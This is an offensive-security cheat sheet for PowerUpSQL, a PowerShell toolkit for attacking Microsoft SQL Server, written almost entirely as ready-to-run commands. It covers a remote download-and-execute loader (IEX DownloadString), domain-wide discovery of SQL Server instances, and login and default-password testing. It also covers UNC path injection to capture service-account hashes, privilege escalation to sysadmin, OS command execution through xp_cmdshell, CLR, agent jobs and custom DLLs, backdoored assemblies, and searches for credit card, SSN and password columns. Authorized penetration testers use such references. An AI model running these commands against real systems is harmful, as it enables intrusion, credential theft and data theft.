# PowerUpSQL

PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server 

Link: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 

Example: 

```text
PS /opt/PowerUpSQL> Import-Module .\PowerUpSQL.ps1  
PS /opt/PowerUpSQL> Get-SQLInstanceDomain -Verbose 
VERBOSE: Grabbing SPNs from the domain for SQL Servers (MSSQL*)... 
VERBOSE: 0 SPNs found. 
VERBOSE: Parsing SQL Server instances from SPNs... 
VERBOSE: 0 instances were found. 
```

Or load into memory

```text
IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.0.1/PowerUpSQL.ps1")
```

#### SQL Server Discovery Cheats 



### SQL Server Discovery Cheats

| Description | Command |
| :--- | :--- |
| Discover Local SQL Server Instances | `Get-SQLInstanceLocal -Verbose` |
| Discover Remote SQL Server Instances | UDP Broadcast Ping `Get-SQLInstanceBroadcast -Verbose`  UDP Port Scan `Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1`  Get the instance list from a file `Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose` |
| Discover Active Directory Domain SQL Server Instances | `Get-SQLInstanceDomain -Verbose` |
| Discover Active Directory Domain SQL Server Instances using alternative domain credentials | `runas /noprofile /netonly /user:domain\user PowerShell.exe` `import-module PowerUpSQL.psd1` `Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username domain\user -password P@ssword123` |
| List SQL Servers using a specific domain account | `Get-SQLInstanceDomain -Verbose -DomainAccount SQLSvc` |
| List shared domain user SQL Server service accounts | `Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object count -Descending | select Count,Name | Where-Object {($_.name -notlike "*$") -and ($_.count -gt 1) }` |

### SQL Server Authentication Cheats

All PowerUpSQL functions support authenticating directly to a known SQL Server instance without having to perform discovery first. You can authenticate using the current domain user credentials or provide an SQL Server login. All PowerUpSQL functions will attempt to authenticate to the provided instance as the current domain user if the username/password parameters are not provided. This also applies if you're running PowerShell through runas /netonly.

Below are some basic examples using the "Get-SQLQuery" function.

| Description | Command Examples |
| :--- | :--- |
| Authenticating to a known SQL Server instance as the current domain user. | **Current Domain User** `Get-SQLQuery -Verbose -Instance "10.2.2.5,1433"` |
| Authenticating to a known SQL Server instance using a SQL Server login. | **Server and Instance Name** `Get-SQLQuery -Verbose -Instance "servername\instancename" -username testuser -password testpass`  **IP and Instance Name** `Get-SQLQuery -Verbose -Instance "10.2.2.5\instancename" -username testuser -password testpass`  **IP and Port** `Get-SQLQuery -Verbose -Instance "10.2.2.5,1433" -username testuser -password testpass` |

### SQL Server Login Test Cheats

| Description | Command |
| :--- | :--- |
| Get a list of domain SQL servers that can be logged into with a provided SQL Server login | `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like "Accessible"}` `$Targets` |
| Get a list of domain SQL servers that can be logged into with the current domain account | `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"}` `$Targets` |
| Get a list of domain SQL servers that can be logged into using an alternative domain account | `runas /noprofile /netonly /user:domain\user PowerShell.exe` `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15` |
| Get a list of domain SQL servers that can be logged into using an alternative domain account from a non domain system. | `runas /noprofile /netonly /user:domain\user PowerShell.exe` `Get-SQLInstanceDomain -Verbose -Username 'domain\user' -Password 'MyPassword!' -DomainController 10.1.1.1 | Get-SQLConnectionTestThreaded -Verbose -Threads 15` |
| Discover domain SQL Servers and determine if they are configured with default passwords used by common applications based on the instance name | `Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose` |

### SQL Server Authenticated Information Gathering Cheats

| Description | Command |
| :--- | :--- |
| Get general server information such as SQL/OS versions, service accounts, sysdmin access etc. | Get information from a single server `Get-SQLServerInfo -Verbose -Instance SQLServer1\Instance1`  Get information from domain servers `$ServerInfo = Get-SQLInstanceDomain | Get-SQLServerInfoThreaded -Verbose -Threads 10` `$ServerInfo`  Note: Running this against domain systems can reveal where Domain Users have sysadmin privileges. |
| Get an inventory of common objects from the remote server including permissions, databases, tables, views etc, and dump them out into CSV files. | `Invoke-SQLDumpInfo -Verbose -Instance Server1\Instance1` |

### SQL Server Privilege Escalation Cheats

| Description | Command |
| :--- | :--- |
| Domain User to SQL Service Account. While running as a domain user this function will automatically do 4 things. 1. Identify SQL Servers on the domain via a LDAP query to a DC for SPNs. 2. Attempt to log into each. 3. Perform UNC path injection using various methods. 4. Attempt to capture the password hashes for the associated SQL Server service account. | `Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12` |
| OS admin to sysadmin via service account impersonation, then all PowerUpSQL commands can be run as a sysadmin. | `Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04\BOSCHSQL` |
| Audit for Issues | `Invoke-SQLAudit -Verbose -Instance SQLServer1` |
| Escalate to sysadmin | `Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1` |
| Execute OS commands: xp\_cmdshell | `$Targets | Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10` |
| Execute OS commands: Custom xp | `Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test -Verbose` Host the test.dll on a share readable by the SQL Server service account. `Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\yourserver\yourshare\myxp.dll'"` `xp_test` `sp_dropextendedproc 'xp_test'` |
| Execute OS commands: CLR | `$Targets | Invoke-SQLOSCLR -Verbose -Command "Whoami"` |
| Execute OS commands: Ole Automation Procedures | `$Targets | Invoke-SQLOSOle -Verbose -Command "Whoami"` |
| Execute OS commands: External Scripting - R | `$Targets | Invoke-SQLOSR -Verbose -Command "Whoami"` |
| Execute OS commands: External Scripting - Python | `$Targets | Invoke-SQLOSPython -Verbose -Command "Whoami"` |
| Execute OS commands: Agent Job - CmdExec | `$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\windows\temp\test1.txt"` |
| Execute OS commands: Agent Job - PowerShell | `$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt' -Sleep 20` |
| Execute OS commands: Agent Job - VBScript | `$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt'` |
| Execute OS commands: Agent Job - JScript | `$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt'` |
| Crawl database links | `Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1` |
| Crawl database links and execute query | `Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1 -Query "select name from master..sysdatabases"` Blog: [https://blog.netspi.com/sql-server-link-crawling-powerupsql/](https://blog.netspi.com/sql-server-link-crawling-powerupsql/) |
| Crawl database links and execute OS command | `Get-SQLCrawl -instance "SQLSERVER1\Instance1" -Query "exec master..xp_cmdshell 'whoami'"` |
| Dump contents of Agent jobs. Often contain passwords. Verbose output includes job summary data. | `$Results = Get-SQLAgentJob -Verbose -Instance Server1\Instance1 -Username sa -Password 'P@ssword!'` or `$Results = Get-SQLInstanceDomain -Verbose | Get-SQLAgentJob -Verbose -Username sa -Password 'P@ssword!'` `$Results | Out-GridView` |
| Enumerate all SQL Logins as least privilege user and test username as password. | Run against single server `Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\Instance1` Run against domain SQL Servers `$WeakPasswords = Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditWeakLoginPw -Verbose` `$WeakPasswords` |

### SQL Server Data Targeting Cheats

| Description | Command |
| :--- | :--- |
| Dump an inventory of common objects to csv in the current directory. | `Invoke-SQLDumpInfo -Verbose -Instance server1\instance1` |
| Execute arbitrary query | `$Targets | Get-SQLQuery -Verbose -Query "Select @@version"` |
| Grab basic server information | `$Targets | Get-SQLServerInfoThreaded -Threads 10 -Verbose` |
| Grab list of non-default databases | `$Targets | Get-SQLDatabaseThreaded –Verbose –Threads 10 -NoDefaults` |
| Dump common information from server to files | `Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv` |
| Find sensitive data based on column name | `$Targets | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword "credit,ssn,password" –SampleSize 2 –ValidateCC –NoDefaults` |
| Find sensitive data based on column name, but only target databases with transparent encryption | `$Targets | Get-SQLDatabaseThreaded –Verbose –Threads 10 -NoDefaults | Where-Object {$_.is_encrypted –eq “TRUE”} | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults` |

### Miscellaneous Post Exploitation Cheats

| Description | Command |
| :--- | :--- |
| Export all custom CLR assemblies to DLLs. They can be decompiled offline, and often contain passwords. Also, they can be backdoored without too much effort. | `$Results = Get-SQLStoredProcedureCLR -Verbose -Instance Server1\Instance1 -Username sa -Password 'P@ssword!' -ExportFolder c:\temp` `$Results | Out-GridView` |
| Create a SQL command that can be used to import an existing \(or backdoored\) CLR assembly. | `Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.dll` Blog: [https://blog.netspi.com/attacking-sql-server-clr-assemblies/](https://blog.netspi.com/attacking-sql-server-clr-assemblies/) |
| Create a DLL and SQL command that can be used to import a CLR assembly to execute OS commands. | `Create-SQLFileCLRDll -Verbose -ProcedureName runcmd -OutDir c:\temp -OutFile evil` |
| Get a list of Shared SQL Server service accounts | `Get-SQLInstanceDomain -Verbose | Select-Object DomainAccount, ComputerName -Unique | Group-Object DomainAccount | Sort-Object Count -Descending`  Note: Any count greater than 1 indicates a domain account used on multiple systems that could potentially be used for SMB Relay attacks.\` |

